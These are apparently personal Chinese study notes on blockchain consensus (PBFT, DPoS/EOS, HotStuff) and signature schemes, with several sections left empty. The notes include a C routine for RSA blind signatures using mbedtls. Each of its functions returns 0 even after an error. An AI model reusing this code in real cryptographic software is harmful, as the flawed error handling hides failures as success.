提交阶段保证了可信节点就本地提交的客户端请求的序列号取得了共识，即便这些客户端请求在每个节点是在不同的视图号中提交的，保证了所有的可信节点按照给定的顺序执行了所有的客户端请求，从而实现了安全性。当节点收到超过2f个不同节点发送过来的commit消息之后，会执行客户端请求m中所要求的服务操作，同时将执行结果发送给客户端，这个保证了在可信节点中提交的任意一个客户端请求，最终都会在另外f+1个节点中被提交到本地的。



### 算法优化

#### 检查点协议

PBFT通过三阶段协议来对请求达成共识，但是各个阶段产生的消息如果不进行垃圾回收的话，系统的存储资源将会不堪重负。为此，PBFT算法设计了检查点协议来丢弃本地的消息日志文件中的旧消息。垃圾回收的设计需要考虑何时该删除消息，同时保证某个消息在可信节点中都被删除之后，某个节点在缺失这些消息的情况下在同步到最新的状态后能够证明这个状态是正确的。

根据前面的三阶段协议，我们可以知道客户端收到某个请求的执行结果的时候，表明该请求已经被至少f+1个节点提交过了，这个时候就可以删除该消息了。对于第二个问题，检查点协议是通过提供额外的证据，checkpoint 消息来证明这个状态是正确的。但是如果每次执行完一个客户端请求之后都生成上述要求的证据，那么这个操作将是非常昂贵的。实际上，PBFT的检查点协议是周期性地生成这些证明，比如当请求的序列号整除周期T的时候。

![image-20230519163416252](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519163416252.png)

![image-20230519163429439](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519163429439.png)



﻿检查点协议除了用于垃圾回收外，还用于更新请求序列号的有效范围，**序列号的最低值h设为最近一次检查点里面的请求序列号，序列号的最高值设为H=h+k**，其中需要设置得大一点，比checkpoint的周期要大，不然节点收到序列号较大的请求之后需要阻塞等待到下一个检查点才能处理。比如说，如果检查周期是100个请求，那么k可以设置成200。



#### 视图变更协议

前面我们提到过，一些拜占庭算法不能解决主节点出故障的问题。PBFT算法是通过视图变更协议来允许系统在主节点出故障的情况下仍能够正常运转，从而保证了系统的活性。视图变更协议实际上是通过超时机制触发的，通过超时机制，我们可以避免主节点不工作的情况下，副节点无限期地等待客户端请求被执行。假定系统当前状态如图4-2所示，视图号为v。

![image-20230519163549820](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519163549820.png)

##### 维持计时器

副节点会针对视图v维持一个计时器。当在收到主节点发送过来的一个有效的请求而且没有执行的时候，如果是针对当前视图的计时器还没有启动的话，那么节点会启动一个新的计时器。如果节点还在执行其他请求的话，那么节点会重置该请求的计时器。如果节点不再等待执行该请求的时候，会停止视图v的计时器。



##### 请求视图变更

如图4-3所示，当副节点的视图v的计时器如果超时了，就会生成一个view-change 消息，记录到本地日志文件中，同时广播给其他节点，要求替换掉主节点，变更到下一个视图v+1。注意，在视图变更期间，除了 checkpoint、view-change 和 newview 消息之外，备份节点i是不会接受其他消息的。

![image-20230519163802203](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519163802203.png)

##### 切换新视图

如图4-4所示，当新视图v+1对应的新的主节点接收到2f个节点的发送过来的有效的view-change消息之后，会向其他节点发送一个带上自己签名的new-view消息，提议系统内所有节点切换到下一个视图v+1，同时接受自己成为新的主节点。这个 new-view 消息的另外一个作用是找到所有节点的共同的稳定检查点，同时针对那些携带了尚未提交执行的请求的 prepare 消息重新生成相应的 pre-prepare 消息，这个主要是在切换到新视图之后，新的主节点需要重新对这些未处理的请求分配序列号，然后对这些请求再次执行一遍三阶段协议。

![image-20230519163951804](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230519163951804.png)

﻿副节点在收到要求将视点变更为v+1的new-vew消息之后，在确认消息有效之后，会接受该new-view消息，记录到本地消息文件中，同时将视点更换到新的视点v+1。此外，副节点还会new-view中携带的由新的主节点重新生成的pre-prepare消息都追加记录到本地的消息日志中，并按照检查点协议进行垃圾回收，删除比较老的消息。然后，对于new-vew消息中集合携带的所有由新主节点生成的新的pre-prepare消息，备份节点都会生成相应的prepare消息，记录到本地日志文件中，转发给其他节点，即对这些未处理的请求在新的视图中重新执行一遍三阶段协议，保证视图切换过程中未处理的请求能够重新被处理。





#### PBFT算法应用

PBFT算法通过三阶段协议保证了系统能够在包含作恶节点的情况下达成共识，将算法复杂度由指数级别降低成了多项式级别，大大地降低了网络通信的开销，为拜占庭算法的在生产环境中的实际运用提供了可能。此外，PBFT算法通过检查点协议进行垃圾回收的同时保证了系统能够感知全局状态的一致性，而视图变更协议解决了主节点失效的问题，保证了系统的活性。实际上，相比于比特币等区块链系统使用的概率性的PoW算法，PBFT算法的确定性特性保证了系统具有应付作恶节点的能力同时不会分叉，非常适合于联盟链和私链的搭建，比如联盟链 fabric 中最初就提供了PBFT作为共识算法。虽然 PBFT 算法性能比原有的拜占庭算法提高了很多，但是PBFT算法的性能会随着节点个数的增加而急剧下降，所以通常会结合DPoS等算法来对节点的权限进行控制，比如 tendermint 共识算法，即区块链上的PBFT算法，就是使用DPoS来控制验证节点的数量的。







## DPoS



### dpos定义



2014年4月由Bitshares的首席开发者Dan Larimer 提出。  

 	 DPoS 的全称是 Delegated Proof of Stake 代理权益证明，它是由持有币的人选出一定数量（**一般是101个，不一定，由项目方决定， 不能少于11个**）的代表节点（受托人）来运营网络（类似于人民群众选举出来的人大代表，由人大代表来维护人民的权益）。受托节点有记账的权力（也就是有生成区块、验证交易、区块上链的权限），但是**新生成的区块都要超过2/3的受托节点认同**，才被认为是有效的区块，才可以上链，区块上链后永久有效。






### dpos原理

任何一个持币的用户都可以参与到投票和竞选委托人这两个过程中，持币数量越多，投票的权重越高。

利用pos的思想，由于利益相关者（持币者，与币龄无关）（一般是101个，具体数量由项目方决定，但是不能少于11个）投票产生多个委托节点负责记账。 **每个受托人是完全等价的，与币龄无关**。 受托人在完成本职工作的同时可以领取区块奖励和交易手续费。受托人之间不需要竞争记账权，随机轮流负责记账。

为了防止受托人作弊，引入了相关的保证金制度，一旦产生了错误的区块，或者是在规定的时间内没有产生区块，不仅不会得到奖励，而且还会损失保证金，还存在随时被投票出局的风险。





### EOS

step1. 全网持有代币的人可以通过投票系统选举出一定数量的节点作为区块生产者(根据其持有的EOS的数量1：1获得选票)

投票选出21个区块生产者

- 区块产生是**以21个区块为一个周期**。
- 在每个出块周期开始时，21个区块生产者会被投票选出。
- 前20名出块者首选自动选出，第21个出块者按所得投票数目对应概率选出。



step2. 被选举的节点相互协作，**按照一定的顺序，轮流进行记账**。
所选择的生产者会根据从块时间导出的伪随机数进行混合。以便保证出块者之间的连接尽量平衡。



step3. 记账
21个区块生产者，不仅记账，还需要提供EOS全链所需要的计算和网络资源（包括CPU、内存、存储容量等等）。





#### 最长链原则

在正常情况下，DPOS块链不会经历任何叉，因为块生产者合作生产区块而不是竞争。

+ 如果有区块分叉，共识将自动切换到最长的链条。

+ 约定每个节点不能同时在两个链上出块（否则节点将被判定为违规，且失去资格），这使得当产生分叉之后，最多过一半见证人节点总数的高度之后（在EOS里是11个区块高度），就只会保留一条链了。

+ 具有更多生产者的区块链长度将比具有较少生产者的区块链增长速度更快。
  



#### 优势

+ 节点由竞争改为协作，并且只有21个节点，更加容易迅速的达成共识，有利于提升主链的性能（TPS）。
+ 不会产生硬分叉，因为节点也会遵循最长链原则，并且每个节点不能同时参与两条链。所以，当产生分叉之后，最多过一半见证人节点总数的高度之后（在EOS里是11个区块高度），就只会保留一条链了。每次系统大升级也不会导致硬分叉，只需要让所有见证人节点同时升级即可。
+ 安全性更强，要控制超过2/3的节点才能够将错误的区块定为不可逆状态。
+ 确认速度非常快
  



#### 缺点

+ 弱中心化

+ 随着这些见证人节点存在的时间的推移，由于参与记账的奖励，会使得中心化程度越来越高。这对整个社群可能是潜在的风险。(根据以往基于DPOS模式的项目，例如BitShares和Steemit来看，确实最终的中心化程度非常高，有一段时间绝大部分的见证人实际上是BM自己或受BM控制的节点)

+ DPoS挖矿需要抵押代币来完成挖矿，这种“矿机”就是网络不可分割的一部分。如果挖矿节点被攻击，比如被恶意控制，那全网能充当“矿机”的币也会被恶意控制，如果要恢复，只能硬分叉换一条链
  （PoW 挖矿的矿机本身是和网络完全分离的，也就是说矿机可以不算是网络的一部分，矿机提供的算力才是网络的一部分，而若矿机全部毁了，那么只要能另行找到提供算力的东西就可以）









## Hotstuff

![image-20230521192057874](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230521192057874.png)

+ 在New-View阶段：新视图开始后，所有副本节点会向主节点发送包含视图编号最大的prepareQC的new-view消息。
+ 在Prepare阶段：主节点从收到2*f*+1个new-view消息后，先从消息中提取视图编号最大的prepareQC作为highQC，然后生成新区块。主节点向所有副本节点广播包含新区块提案和签名的准备消息prepare。副本节点会验证prepare消息，并发送包含签名的投票消息prepare-vote。
+ 在PreCommit阶段：主节点收到2f+1个prepare-vote消息后，将所有消息和签名聚合成第一轮投票凭证prepareQC。然后，主节点向副本节点广播包含prepareQC的预提交消息precommit发送给所有副本节点。副本节点收到precommit消息后，会验证消息并将第二轮投票信息precommit-vote发送给主节点。
+ 在Commit阶段：主节点收到2f+1个precommit-vote消息后，会将所有消息和签名聚合成第二轮投票凭证PreCommitQC。然后，将包含PreCommitQC的提交消息commit发送给所有副本节点。副本节点收到消息并验证消息后，会将本地的lockedQC更新成PreCommitQC，然后将投票消息Commit-vote发送给主节点。
+ 在Decide阶段：主节点收到2*f*+1个Commit-vote消息后，会将所有消息和签名聚合成第三轮投票凭证commitQC，然后将包含commitQC的决定消息decide发送给所有副本节点。副本节点验证消息后，会执行消息中新区块事务，并将视图编号加1，然后开启一个新的视图。















# 密码学知识



## AES





## RSA







## ECC







## 签名

### 多重签名

多重签名是多个用户对同一个消息的签名。



在区块链中，即一个多重签名的地址关联n个私钥，想要花费这个地址上的代币至少需要m个私钥签名才可以。



### 聚合签名

聚合签名：允许$m$个用户对$m$条不同消息的签名，将这$m$个签名聚合成一个唯一的短签名，给定聚合签名$\delta$、参与聚合签名的用户$u_i$、签名的消息$info_i$，就可以验证该用户$u_i$对消息$info_i$做的签名。



在hotstuff中的聚合签名是对同一条消息的签名



### 环签名

环签名：签名者任意选取一组成员（包含自己）作为可能的签名者，用自己的私钥和其他成员的公钥对文件进行签名。签名者选取的这组成员称为环，生成的签名称为环签名。

+ 正确性：环中任何成员均可验证签名的正确性。

+ 匿名性：签名者隐藏在多个成员中，任何获得签名的一方，能够正确推断出签名者身份的概率不超过1/n，其中n为环中成员数量
+ 不可伪造性：环中成员不能伪造其他成员进行签名



基于RSA的环签名：[密码学系列 - 基于RSA的环签名 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/611076705)



环签名算法参考：[(35条消息) 环签名原理详解_冷板凳yyds的博客-CSDN博客](https://blog.csdn.net/qq_39896020/article/details/121723158)  和  [(35条消息) 环签名原理与隐私保护_跨链技术践行者的博客-CSDN博客](https://blockchain-fans.blog.csdn.net/article/details/108275373)





### 群签名

![image-20230521165144710](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230521165144710.png)

![image-20230521165201384](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230521165201384.png)



[(35条消息) 群签名与环签名的介绍_群签名算法_what_lm的博客-CSDN博客](https://blog.csdn.net/what_lm/article/details/110367433)





### 盲签名

![image-20230521193029057](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230521193029057.png)

```c
//C语言实现的RSA盲签名


//首先使用盲化银子blind_factor对原始的消息m进行盲化，生成盲化消息blind_message
int blindsignature_hide_message(mbedtls_mpi* m, mbedtls_mpi* blind_factor, mbedtls_mpi* e, mbedtls_mpi* n, mbedtls_mpi* blind_message)
{
	int ret;
	mbedtls_mpi r;
	mbedtls_mpi_init(&r);

	// r = blind_factor ^ e mod n
	if ((ret = mbedtls_mpi_exp_mod(&r, blind_factor, e, n, NULL) ) != 0)
	{
		printf("Hide message: mbedtls_mpi_mod_init failed ret=%8X\r\n", ret);
		goto EXIT;
	}
	// m1 = m * r
	if ((ret = mbedtls_mpi_mul_mpi(blind_message, m, &r)) != 0)
	{
		printf("Hide message: mbedtls_mpi_mul_mpi failed ret=%08X\r\n", ret);
		goto EXIT;
	}
	// blind_message = m1 mod n
	if ((ret = mbedtls_mpi_mod_mpi(blind_message, blind_message, n)) != 0)
	{
		printf("Hide message: mbedtls_mpi_mod_mpi failed ret=%08X\r\n", ret);
		goto EXIT;
	}
EXIT:
	mbedtls_mpi_free(&r);
	return 0;
}

//对盲化的消息进行盲签名，过程同普通rsa签名一样
int blindsignature_sign(mbedtls_mpi* blind_message, mbedtls_mpi* d, mbedtls_mpi* n, mbedtls_mpi* s)
{
	int ret;
	mbedtls_mpi r;

	//s = m ^d mod n
	if ((ret = mbedtls_mpi_exp_mod(s, blind_message, d, n, NULL)) != 0)
	{
		printf("Blind signature: mbedtls_mpi_exp_mod failed ret=%08X\r\n", ret);
		goto EXIT;
	}
EXIT:
	return 0;
}

//对签名结果blind_signature，使用blind_factor去盲化，得到签名值signature
int blindsignature_unblind_sign(mbedtls_mpi* blind_signature, mbedtls_mpi* blind_factor, mbedtls_mpi* n, mbedtls_mpi* signature)
{
	int ret;
	mbedtls_mpi inv_blind_factor;

	mbedtls_mpi_init(&inv_blind_factor);

	if ((ret = mbedtls_mpi_inv_mod(&inv_blind_factor, blind_factor, n)) != 0)
	{
		printf("Unblind signature: mbedtls_mpi_inv_mod failed ret=%08X\r\n", ret);
		goto EXIT;
	}

	if ((ret = mbedtls_mpi_mul_mpi(signature, &inv_blind_factor, blind_signature)) != 0)
	{
		printf("Unblind signature: mbedtls_mpi_mul_mpi failed ret=%08X\r\n", ret);
		goto EXIT;
	}

	if ((ret = mbedtls_mpi_mod_mpi(signature, signature, n)) != 0)
	{
		printf("Unblind signature: mbedtls_mpi_mod_mpi failed ret=%08X\r\n", ret);
		goto EXIT;
	}
EXIT:
	mbedtls_mpi_free(&inv_blind_factor);
	return 0;
}

```







## 零知识证明





### Groth16











## 同态加密

### BVF





### BVG





### CKKS







## 代理重加密



### 双线性映射代理重加密





### 门限代理重加密







## ABE加密











# 跨链知识

